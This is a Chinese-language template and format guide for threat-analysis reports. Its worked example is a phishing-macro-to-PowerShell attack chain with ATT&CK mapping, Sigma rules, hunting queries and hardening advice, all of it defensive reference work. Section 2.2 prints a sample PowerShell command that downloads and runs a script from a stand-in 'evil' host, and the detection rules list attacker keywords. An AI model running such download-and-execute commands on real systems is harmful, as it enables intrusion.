# 攻防技战法分析报告格式规范

## 报告结构

| # | 章节 | 必含 | 内容要点 |
|---|------|------|----------|
| 1 | 分析概览 | ✅ | 来源/时间/技术统计 |
| 2 | 攻击技术 | ✅ | ATT&CK 映射/具体手法/IOC |
| 3 | 防御技术 | ✅ | 分层防御措施/优先级 |
| 4 | 攻击链路图 | ✅ | 攻击阶段可视化 |
| 5 | ATT&CK 矩阵 | ✅ | 战术/技术/子技术表格 |
| 6 | 检测规则 | 条件 | Sigma/YARA 规则 |
| 7 | 威胁狩猎查询 | 条件 | Splunk/KQL 查询语句 |

---

## 威胁等级定义

| 等级 | 条件 | 标记 |
|------|------|------|
| Critical | 含 RCE/0day/APT 技术 | 🔴 |
| High | 含持久化/横向移动技术 | 🟠 |
| Medium | 含执行/凭证访问技术 | 🟡 |
| Low | 仅侦察/信息收集技术 | 🟢 |

---

## 报告模板

```markdown
# 🟠 攻防技战法分析报告

**来源文档**: {报告/事件名称}
**分析时间**: YYYY-MM-DD HH:MM
**威胁等级**: 🟠 High
**技术总数**: 8 个 ATT&CK 技术

---

## 1. 分析概览

### 1.1 来源信息

| 项目 | 值 |
|------|-----|
| 文档类型 | APT 报告 / 事件分析 / 威胁情报 |
| 来源 | 安全厂商 / 内部事件 / OSINT |
| 关联组织 | APT-XX (如适用) |
| 目标行业 | 金融 / 能源 / 政府 |

### 1.2 技术统计

| 战术阶段 | 技术数量 |
|----------|----------|
| 初始访问 | 2 |
| 执行 | 2 |
| 持久化 | 1 |
| 权限提升 | 1 |
| 命令控制 | 1 |
| 数据外泄 | 1 |

---

## 2. 攻击技术

### 2.1 [T1566.001] 钓鱼：恶意附件

**战术阶段**: 初始访问 (Initial Access)

**技术描述**:
通过伪装的邮件附件投递恶意载荷，诱导用户打开执行。

**具体手法**:
- 使用 .docm 宏文档
- 伪装为发票/简历/报价单
- 利用社会工程学构造邮件内容

**IOC 指标**:
| 类型 | 值 | 说明 |
|------|-----|------|
| 发件人 | xxx@malicious[.]com | 钓鱼邮箱 |
| 附件哈希 | abc123... | 恶意文档 |
| 文件名 | Invoice_2024.docm | 伪装发票 |

**检测规则**:
```yaml
title: 可疑 Office 宏执行
status: experimental
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith:
      - '\WINWORD.EXE'
      - '\EXCEL.EXE'
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
  condition: selection
level: high
```

---

### 2.2 [T1059.001] 命令和脚本解释器：PowerShell

**战术阶段**: 执行 (Execution)

**技术描述**:
使用 PowerShell 下载并执行恶意脚本，绕过传统安全检测。

**具体手法**:
- Base64 编码命令
- 绕过执行策略 (-ExecutionPolicy Bypass)
- 内存加载无文件攻击

**命令示例**:
```powershell
powershell -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAA...
powershell IEX(New-Object Net.WebClient).DownloadString('http://evil[.]com/payload.ps1')
```

**检测规则**:
```yaml
title: 可疑 PowerShell 编码命令
detection:
  selection:
    CommandLine|contains:
      - '-enc'
      - '-encodedcommand'
      - 'downloadstring'
      - 'iex'
      - 'invoke-expression'
  condition: selection
level: high
```

---

## 3. 防御技术

### 3.1 针对 [T1566.001] 钓鱼的防御

| 防御层 | 措施 | 优先级 | 实施难度 |
|--------|------|--------|----------|
| 邮件网关 | 阻止宏文档附件 (.docm, .xlsm) | 🔴 高 | 低 |
| 终端 | 禁用 Office 宏或仅允许签名宏 | 🔴 高 | 中 |
| 网络 | 沙箱检测邮件附件 | 🟠 中 | 高 |
| 用户 | 安全意识培训 | 🟠 中 | 低 |
| 监控 | 部署进程创建监控规则 | 🔴 高 | 中 |

**GPO 配置建议**:
```
用户配置 > 管理模板 > Microsoft Office > 安全设置
- 禁用所有宏（无通知）: 已启用
- 阻止从 Internet 下载的 Office 文件中的宏: 已启用
```

### 3.2 针对 [T1059.001] PowerShell 的防御

| 防御层 | 措施 | 优先级 | 实施难度 |
|--------|------|--------|----------|
| 策略 | 启用 Constrained Language Mode | 🔴 高 | 中 |
| 日志 | 启用 PowerShell 脚本块日志 | 🔴 高 | 低 |
| 终端 | 部署 AMSI 集成 EDR | 🟠 中 | 高 |
| 网络 | 监控 PowerShell 外连行为 | 🟠 中 | 中 |

**日志配置**:
```powershell
# 启用 PowerShell 脚本块日志
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
```

---

## 4. 攻击链路图

```
钓鱼邮件 → 宏执行 → PowerShell下载 → 持久化 → C2通信 → 数据窃取
[T1566]    [T1204]   [T1059.001]      [T1053]   [T1071]   [T1041]
   │          │           │              │         │         │
   ▼          ▼           ▼              ▼         ▼         ▼
 邮件网关   终端防护    脚本监控      任务审计   流量检测   DLP
```

### 关键阻断点

| 阶段 | 阻断措施 | 有效性 |
|------|----------|--------|
| 投递 | 邮件网关过滤 | ⭐⭐⭐⭐ |
| 执行 | 宏禁用策略 | ⭐⭐⭐⭐⭐ |
| 下载 | 出站流量监控 | ⭐⭐⭐ |
| 持久化 | 计划任务审计 | ⭐⭐⭐⭐ |

---

## 5. ATT&CK 矩阵映射

| 战术 | 技术 ID | 技术名称 | 子技术 |
|------|---------|----------|--------|
| 初始访问 | T1566 | 钓鱼 | T1566.001 附件 |
| 执行 | T1204 | 用户执行 | T1204.002 恶意文件 |
| 执行 | T1059 | 命令和脚本解释器 | T1059.001 PowerShell |
| 持久化 | T1053 | 计划任务/作业 | T1053.005 计划任务 |
| 持久化 | T1547 | 启动或登录自启动执行 | T1547.001 注册表 Run 键 |
| 命令控制 | T1071 | 应用层协议 | T1071.001 Web 协议 |
| 命令控制 | T1573 | 加密通道 | T1573.001 对称加密 |
| 数据外泄 | T1041 | 通过 C2 通道外泄 | - |

---

## 6. 威胁狩猎查询

### 6.1 Splunk SPL

```spl
# 检测 Office 进程启动可疑子进程
index=windows EventCode=4688
| where match(ParentImage, "(?i)(WINWORD|EXCEL|POWERPNT)\.EXE$")
| where match(Image, "(?i)(cmd|powershell|wscript|cscript|mshta)\.exe$")
| table _time, ComputerName, ParentImage, Image, CommandLine

# 检测 PowerShell 编码命令
index=windows EventCode=4688 Image="*powershell.exe"
| where match(CommandLine, "(?i)(-enc|-encodedcommand)")
| table _time, ComputerName, User, CommandLine
```

### 6.2 Microsoft Sentinel KQL

```kql
// 检测 Office 启动可疑进程
DeviceProcessEvents
| where InitiatingProcessFileName in~ ("winword.exe", "excel.exe", "powerpnt.exe")
| where FileName in~ ("cmd.exe", "powershell.exe", "wscript.exe", "cscript.exe", "mshta.exe")
| project Timestamp, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine

// 检测 PowerShell 下载行为
DeviceProcessEvents
| where FileName =~ "powershell.exe"
| where ProcessCommandLine has_any ("downloadstring", "downloadfile", "invoke-webrequest", "wget", "curl")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
```

### 6.3 Elastic EQL

```eql
sequence by host.name with maxspan=5m
  [process where process.parent.name : ("WINWORD.EXE", "EXCEL.EXE") and process.name : "cmd.exe"]
  [process where process.name : "powershell.exe" and process.command_line : "*-enc*"]
```

---

## 7. IOC 汇总

### 7.1 网络 IOC

| 类型 | 值 | 说明 |
|------|-----|------|
| IP | 1.2.3[.]4 | C2 服务器 |
| 域名 | evil[.]com | 载荷下载 |
| URL | hxxp://evil[.]com/payload.ps1 | 恶意脚本 |

### 7.2 文件 IOC

| 文件名 | MD5 | 类型 |
|--------|-----|------|
| Invoice.docm | abc123... | 恶意宏文档 |
| payload.exe | def456... | 后门程序 |

### 7.3 行为 IOC

| 类型 | 特征 |
|------|------|
| 进程链 | WINWORD.EXE → cmd.exe → powershell.exe |
| 注册表 | HKCU\...\Run\Update |
| 计划任务 | \Microsoft\Windows\NetService |

---

## 8. 结论与建议

### 8.1 威胁评估

| 维度 | 评估 |
|------|------|
| 复杂度 | 中等 - 使用常见 APT 技术组合 |
| 隐蔽性 | 高 - 多层编码和无文件技术 |
| 影响范围 | 高 - 可导致数据泄露和持久控制 |

### 8.2 优先修复建议

| 优先级 | 措施 | 预期效果 |
|--------|------|----------|
| P0 | 禁用 Office 宏 | 阻断初始访问 |
| P0 | 启用 PowerShell 日志 | 提升检测能力 |
| P1 | 部署邮件沙箱 | 发现恶意附件 |
| P1 | 部署 EDR | 实时行为检测 |
| P2 | 安全意识培训 | 降低钓鱼成功率 |

---

*报告生成时间: YYYY-MM-DD HH:mm*
```

---

## 简化输出格式

当仅需快速提取时，使用简化格式：

```markdown
## ATT&CK 技术速查

| 技术 | 战术 | 检测重点 |
|------|------|----------|
| T1566.001 | 初始访问 | Office 宏执行 |
| T1059.001 | 执行 | PowerShell 编码命令 |
| T1053.005 | 持久化 | 异常计划任务 |

## 快速防御清单

- [ ] 禁用 Office 宏
- [ ] 启用 PowerShell 日志
- [ ] 部署进程监控规则
- [ ] 审计计划任务
```
